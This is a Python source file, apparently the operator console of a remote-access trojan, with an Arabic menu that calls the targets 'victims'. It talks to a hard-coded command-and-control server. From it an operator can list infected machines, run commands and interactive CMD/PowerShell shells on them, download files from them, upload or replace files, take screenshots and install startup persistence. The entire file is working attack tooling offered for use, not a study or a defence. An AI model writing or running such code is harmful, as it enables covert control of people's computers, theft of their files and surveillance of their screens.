#!/usr/bin/env python3
import requests
import json
import time
import os
import subprocess
import re
import base64

GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
WHITE = '\033[97m'
GRAY = '\033[90m'
RESET = '\033[0m'
BOLD = '\033[1m'

SERVER_URL = "https://promal.onrender.com"

# ============================================================
# 🎨 تلوين النتائج
# ============================================================
def colorize_output(text):
    lines = text.split('\n')
    colored = []
    for line in lines:
        if not line.strip():
            colored.append('')
            continue
        if '<DIR>' in line:
            parts = line.split()
            if len(parts) >= 4:
                name = parts[-1]
                rest = ' '.join(parts[:-1])
                colored.append(f"{rest} {BLUE}{name}{RESET}")
            else:
                colored.append(line)
        elif line.startswith('d'):
            parts = line.split()
            if len(parts) >= 9:
                name = parts[-1]
                rest = ' '.join(parts[:-1])
                colored.append(f"{rest} {BLUE}{name}{RESET}")
            else:
                colored.append(line)
        elif line.startswith('-'):
            parts = line.split()
            if len(parts) >= 9:
                name = parts[-1]
                rest = ' '.join(parts[:-1])
                colored.append(f"{rest} {RED}{name}{RESET}")
            else:
                colored.append(line)
        elif re.match(r'^\d{2}/\d{2}/\d{4}', line) and '<DIR>' not in line:
            parts = line.split()
            if len(parts) >= 4:
                name = parts[-1]
                rest = ' '.join(parts[:-1])
                colored.append(f"{rest} {RED}{name}{RESET}")
            else:
                colored.append(line)
        else:
            colored.append(f"{GRAY}{line}{RESET}")
    return '\n'.join(colored)

# ============================================================
# 📡 قياس سرعة النت
# ============================================================
def measure_speed():
    try:
        if os.name == 'nt':
            cmd = ["ping", "-n", "4", "8.8.8.8"]
        else:
            cmd = ["ping", "-c", "4", "8.8.8.8"]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        times = re.findall(r'time[=<](\d+\.?\d*)\s*ms', result.stdout, re.IGNORECASE)
        if times:
            avg = sum(float(t) for t in times) / len(times)
            if avg < 30: speed = f"{GREEN}ممتازة 🚀{RESET}"
            elif avg < 60: speed = f"{GREEN}جيدة ✅{RESET}"
            elif avg < 120: speed = f"{YELLOW}متوسطة ⚠️{RESET}"
            elif avg < 200: speed = f"{YELLOW}بطيئة 🐢{RESET}"
            else: speed = f"{RED}ضعيفة ❌{RESET}"
            return avg, speed
        return 0, f"{RED}غير معروف{RESET}"
    except:
        return 0, f"{RED}غير معروف{RESET}"

# ============================================================
# 🎨 Banner
# ============================================================
def banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    lat, spd = measure_speed()
    print(f"""
{BLUE}╔══════════════════════════════════════════════════════════╗
{BLUE}║{BOLD}   ██████╗  ██████╗ ██████╗     ██████╗██╗     ██╗{BLUE}     ║
{BLUE}║{BOLD}   ██╔══██╗██╔═══██╗██╔══██╗    ██╔════╝██║     ██║{BLUE}     ║
{BLUE}║{BOLD}   ██████╔╝██║   ██║██████╔╝    ██║     ██║     ██║{BLUE}     ║
{BLUE}║{BOLD}   ██╔══██╗██║   ██║██╔══██╗    ██║     ██║     ██║{BLUE}     ║
{BLUE}║{BOLD}   ██████╔╝╚██████╔╝██████╔╝    ╚██████╗███████╗██║{BLUE}     ║
{BLUE}║{BOLD}   ╚═════╝  ╚═════╝ ╚═════╝      ╚═════╝╚══════╝╚═╝{BLUE}     ║
{BLUE}╠══════════════════════════════════════════════════════════╣
{BLUE}║  {CYAN}Server:{RESET} {SERVER_URL}
{BLUE}║  {CYAN}Latency:{RESET} {lat:.1f} ms   {CYAN}Speed:{RESET} {spd}
{BLUE}╠══════════════════════════════════════════════════════════╣
{BLUE}║  {GREEN}list{BLUE}          - عرض الضحايا المتصلين            ║
{BLUE}║  {GREEN}run <id> <cmd>{BLUE}  - تنفيذ أمر مباشر                ║
{BLUE}║  {GREEN}fix-run <id>{BLUE}  - جلسة تفاعلية (أوامر متتالية)    ║
{BLUE}║  {GREEN}change <id> <remote> <local>{BLUE} - استبدال ملف على الضحية ║
{BLUE}║  {GREEN}download <id> <path>{BLUE}  - تحميل ملف من الضحية          ║
{BLUE}║  {GREEN}upload <id> <local> <remote>{BLUE} - رفع ملف للضحية          ║
{BLUE}║  {GREEN}screenshot <id>{BLUE}      - أخذ لقطة شاشة              ║
{BLUE}║  {GREEN}persist <id>{BLUE}         - تثبيت الـ Agent في Startup  ║
{BLUE}║  {GREEN}uninstall <id>{BLUE}       - إزالة الـ Agent            ║
{BLUE}║  {GREEN}exec <id> <ps_cmd>{BLUE}   - تنفيذ PowerShell متقدم     ║
{BLUE}║  {GREEN}clear{BLUE}         - مسح الشاشة                    ║
{BLUE}║  {GREEN}exit{BLUE}          - الخروج                        ║
{BLUE}╚══════════════════════════════════════════════════════════╝
{RESET}
""")

# ============================================================
# 📋 دوال CLI
# ============================================================
def get_bot_cwd(bot_id):
    try:
        r = requests.get(f"{SERVER_URL}/api/list_bots", timeout=5)
        if r.status_code == 200:
            bots = r.json()
            for b in bots:
                if b["id"] == bot_id:
                    return b.get("cwd", "C:\\")
    except:
        pass
    return "C:\\"

def list_bots():
    try:
        r = requests.get(f"{SERVER_URL}/api/list_bots", timeout=10)
        if r.status_code != 200:
            print(f"{RED}[-] Error fetching bots.{RESET}")
            return
        bots = r.json()
        if not bots:
            print(f"{YELLOW}[!] No bots connected.{RESET}")
            return
        print(f"\n{CYAN}Connected Bots:{RESET}")
        print(f"{'-'*60}")
        for b in bots:
            status = "🟢 Online" if time.time() - b["last_seen"] < 30 else "🔴 Offline"
            print(f"  {GREEN}{b['id']}{RESET}  {b['ip']}  [{b.get('cwd', 'C:\\')}]  {status}")
        print()
    except Exception as e:
        print(f"{RED}[-] Error: {e}{RESET}")

def send_cmd(bot_id, cmd):
    try:
        r = requests.post(f"{SERVER_URL}/api/send_cmd", json={"bot_id": bot_id, "cmd": cmd}, timeout=10)
        return r.status_code == 200
    except:
        return False

def get_result(bot_id, timeout=35):
    start = time.time()
    while time.time() - start < timeout:
        try:
            r = requests.get(f"{SERVER_URL}/api/get_result/{bot_id}", timeout=10)
            if r.status_code == 200:
                res = r.json().get("results", [])
                if res:
                    return res
        except:
            pass
        time.sleep(1.5)
    return None

# ============================================================
# 🔥 الأوامر القوية
# ============================================================

def cmd_change_file(bot_id, remote_path, local_path):
    if not os.path.exists(local_path):
        print(f"{RED}[-] Local file not found: {local_path}{RESET}")
        return
    try:
        with open(local_path, 'rb') as f:
            file_content = f.read()
        file_b64 = base64.b64encode(file_content).decode('utf-8')
        print(f"{YELLOW}[*] Local file read: {os.path.basename(local_path)} ({len(file_content)} bytes){RESET}")
    except Exception as e:
        print(f"{RED}[-] Error reading local file: {e}{RESET}")
        return
    cmd = f"CHANGE_FILE|{remote_path}|{file_b64}"
    if not send_cmd(bot_id, cmd):
        print(f"{RED}[-] Failed to send change command.{RESET}")
        return
    print(f"{YELLOW}[*] Change command sent. Waiting for result...{RESET}")
    results = get_result(bot_id, timeout=60)
    if results:
        for r in results:
            print(f"{GREEN}[+]{RESET}\n{r}")
    else:
        print(f"{YELLOW}[!] No response.{RESET}")

def cmd_download(bot_id, remote_path):
    print(f"{YELLOW}[*] Downloading {remote_path} from {bot_id}...{RESET}")
    cmd = f"DOWNLOAD_FILE|{remote_path}"
    if not send_cmd(bot_id, cmd):
        print(f"{RED}[-] Failed to send download command.{RESET}")
        return
    results = get_result(bot_id, timeout=60)
    if results:
        for r in results:
            if r.startswith("[FILE]"):
                parts = r.split("|")
                if len(parts) == 3:
                    filename = parts[1]
                    content_b64 = parts[2]
                    content = base64.b64decode(content_b64)
                    with open(filename, 'wb') as f:
                        f.write(content)
                    print(f"{GREEN}[+] File downloaded: {filename} ({len(content)} bytes){RESET}")
            else:
                print(f"{GREEN}[+]{RESET}\n{r}")
    else:
        print(f"{YELLOW}[!] No response.{RESET}")

def cmd_upload(bot_id, local_path, remote_path):
    if not os.path.exists(local_path):
        print(f"{RED}[-] Local file not found.{RESET}")
        return
    with open(local_path, 'rb') as f:
        content = base64.b64encode(f.read()).decode('utf-8')
    cmd = f"UPLOAD_FILE|{remote_path}|{content}"
    if not send_cmd(bot_id, cmd):
        print(f"{RED}[-] Failed to send upload command.{RESET}")
        return
    results = get_result(bot_id, timeout=60)
    if results:
        for r in results:
            print(f"{GREEN}[+]{RESET}\n{r}")
    else:
        print(f"{YELLOW}[!] No response.{RESET}")

def cmd_screenshot(bot_id):
    print(f"{YELLOW}[*] Taking screenshot from {bot_id}...{RESET}")
    cmd = "SCREENSHOT"
    if not send_cmd(bot_id, cmd):
        print(f"{RED}[-] Failed to send screenshot command.{RESET}")
        return
    results = get_result(bot_id, timeout=60)
    if results:
        for r in results:
            if r.startswith("[SCREENSHOT]"):
                parts = r.split("|")
                if len(parts) == 2:
                    img_b64 = parts[1]
                    img_data = base64.b64decode(img_b64)
                    filename = f"screenshot_{bot_id}_{int(time.time())}.png"
                    with open(filename, 'wb') as f:
                        f.write(img_data)
                    print(f"{GREEN}[+] Screenshot saved: {filename}{RESET}")
            else:
                print(f"{GREEN}[+]{RESET}\n{r}")
    else:
        print(f"{YELLOW}[!] No response.{RESET}")

def cmd_persist(bot_id):
    print(f"{YELLOW}[*] Installing persistence on {bot_id}...{RESET}")
    cmd = "PERSIST"
    if not send_cmd(bot_id, cmd):
        print(f"{RED}[-] Failed to send persist command.{RESET}")
        return
    results = get_result(bot_id, timeout=30)
    if results:
        for r in results:
            print(f"{GREEN}[+]{RESET}\n{r}")
    else:
        print(f"{YELLOW}[!] No response.{RESET}")

def cmd_uninstall(bot_id):
    print(f"{RED}[!] WARNING: This will remove the agent from {bot_id}{RESET}")
    confirm = input(f"{YELLOW}Are you sure? (yes/no): {RESET}").strip().lower()
    if confirm != "yes":
        print(f"{YELLOW}[-] Cancelled.{RESET}")
        return
    cmd = "UNINSTALL"
    if not send_cmd(bot_id, cmd):
        print(f"{RED}[-] Failed to send uninstall command.{RESET}")
        return
    results = get_result(bot_id, timeout=30)
    if results:
        for r in results:
            print(f"{GREEN}[+]{RESET}\n{r}")
    else:
        print(f"{YELLOW}[!] No response.{RESET}")

def cmd_exec(bot_id, ps_cmd):
    print(f"{YELLOW}[*] Executing PowerShell command on {bot_id}...{RESET}")
    cmd = f"EXEC|{ps_cmd}"
    if not send_cmd(bot_id, cmd):
        print(f"{RED}[-] Failed to send exec command.{RESET}")
        return
    results = get_result(bot_id, timeout=45)
    if results:
        for r in results:
            print(f"{GREEN}[+]{RESET}\n{colorize_output(r)}")
    else:
        print(f"{YELLOW}[!] No response.{RESET}")

# ============================================================
# 🔥 الجلسة التفاعلية (fix-run)
# ============================================================
def interactive_session(bot_id):
    shell_type = "cmd"
    print(f"\n{CYAN}Interactive session with {bot_id}. Type 'exit' to quit.{RESET}")
    print(f"{CYAN}Current shell: {shell_type.upper()} | Type 'shell' to switch to PowerShell{RESET}\n")
    
    while True:
        try:
            cwd = get_bot_cwd(bot_id)
            cmd = input(f"{BOLD}{GREEN}{bot_id}{RESET}:{CYAN}{cwd}{RESET}> ").strip()
            if not cmd:
                continue
            if cmd.lower() == "exit":
                break
            if cmd.lower() == "shell":
                if shell_type == "cmd":
                    shell_type = "powershell"
                    print(f"{YELLOW}[+] Switched to PowerShell{RESET}")
                else:
                    shell_type = "cmd"
                    print(f"{YELLOW}[+] Switched to CMD{RESET}")
                continue
            
            print(f"{YELLOW}[*] Sending...{RESET}")
            if not send_cmd(bot_id, cmd):
                print(f"{RED}[-] Failed to send.{RESET}")
                continue
            
            print(f"{YELLOW}[*] Waiting for result...{RESET}")
            results = get_result(bot_id)
            if results:
                for r in results:
                    if r.startswith("[CWD]"):
                        print(f"{YELLOW}{r}{RESET}")
                    else:
                        print(f"{GREEN}[+]{RESET}\n{colorize_output(r)}")
            else:
                print(f"{YELLOW}[!] No response.{RESET}")
        
        except KeyboardInterrupt:
            print(f"\n{YELLOW}Exiting session...{RESET}")
            break
        except Exception as e:
            print(f"{RED}[-] Error: {e}{RESET}")

# ============================================================
# 🚀 الرئيسية
# ============================================================
def main():
    banner()
    while True:
        try:
            cmd = input(f"{BOLD}{GREEN}> {RESET}").strip()
            if not cmd:
                continue
            parts = cmd.split()
            command = parts[0].lower()
            
            if command == "list":
                list_bots()
            
            elif command == "run":
                if len(parts) < 3:
                    print(f"{RED}Usage: run <bot_id> <command>{RESET}")
                    continue
                bot_id, command = parts[1], " ".join(parts[2:])
                print(f"{YELLOW}[*] Sending command...{RESET}")
                if not send_cmd(bot_id, command):
                    print(f"{RED}[-] Failed to send.{RESET}")
                    continue
                print(f"{YELLOW}[*] Waiting for result...{RESET}")
                results = get_result(bot_id)
                if results:
                    for r in results:
                        if r.startswith("[CWD]"):
                            print(f"{YELLOW}{r}{RESET}")
                        else:
                            print(f"{GREEN}[+]{RESET}\n{colorize_output(r)}")
                else:
                    print(f"{YELLOW}[!] No response.{RESET}")
            
            elif command == "fix-run":
                if len(parts) < 2:
                    print(f"{RED}Usage: fix-run <bot_id>{RESET}")
                    continue
                interactive_session(parts[1])
            
            elif command == "change":
                if len(parts) < 4:
                    print(f"{RED}Usage: change <bot_id> <remote_path> <local_path>{RESET}")
                    print(f"{YELLOW}Example: change DESKTOP-ABC C:\\old.txt /home/kali/new.txt{RESET}")
                    continue
                bot_id = parts[1]
                remote_path = parts[2]
                local_path = " ".join(parts[3:])
                cmd_change_file(bot_id, remote_path, local_path)
            
            elif command == "download":
                if len(parts) < 3:
                    print(f"{RED}Usage: download <bot_id> <remote_path>{RESET}")
                    continue
                bot_id = parts[1]
                remote_path = parts[2]
                cmd_download(bot_id, remote_path)
            
            elif command == "upload":
                if len(parts) < 4:
                    print(f"{RED}Usage: upload <bot_id> <local_path> <remote_path>{RESET}")
                    continue
                bot_id = parts[1]
                local_path = parts[2]
                remote_path = parts[3]
                cmd_upload(bot_id, local_path, remote_path)
            
            elif command == "screenshot":
                if len(parts) < 2:
                    print(f"{RED}Usage: screenshot <bot_id>{RESET}")
                    continue
                cmd_screenshot(parts[1])
            
            elif command == "persist":
                if len(parts) < 2:
                    print(f"{RED}Usage: persist <bot_id>{RESET}")
                    continue
                cmd_persist(parts[1])
            
            elif command == "uninstall":
                if len(parts) < 2:
                    print(f"{RED}Usage: uninstall <bot_id>{RESET}")
                    continue
                cmd_uninstall(parts[1])
            
            elif command == "exec":
                if len(parts) < 3:
                    print(f"{RED}Usage: exec <bot_id> <ps_command>{RESET}")
                    print(f"{YELLOW}Example: exec DESKTOP-ABC Get-Process{RESET}")
                    continue
                bot_id = parts[1]
                ps_cmd = " ".join(parts[2:])
                cmd_exec(bot_id, ps_cmd)
            
            elif command in ["clear", "cls"]:
                os.system('clear' if os.name == 'posix' else 'cls')
                banner()
            
            elif command in ["exit", "quit"]:
                print(f"{YELLOW}Exiting...{RESET}")
                break
            
            else:
                print(f"{RED}Unknown command.{RESET}")
                print(f"{CYAN}Commands: list, run, fix-run, change, download, upload, screenshot, persist, uninstall, exec, clear, exit{RESET}")
        
        except KeyboardInterrupt:
            print(f"\n{YELLOW}Exiting...{RESET}")
            break
        except Exception as e:
            print(f"{RED}Error: {e}{RESET}")

if __name__ == "__main__":
    main()
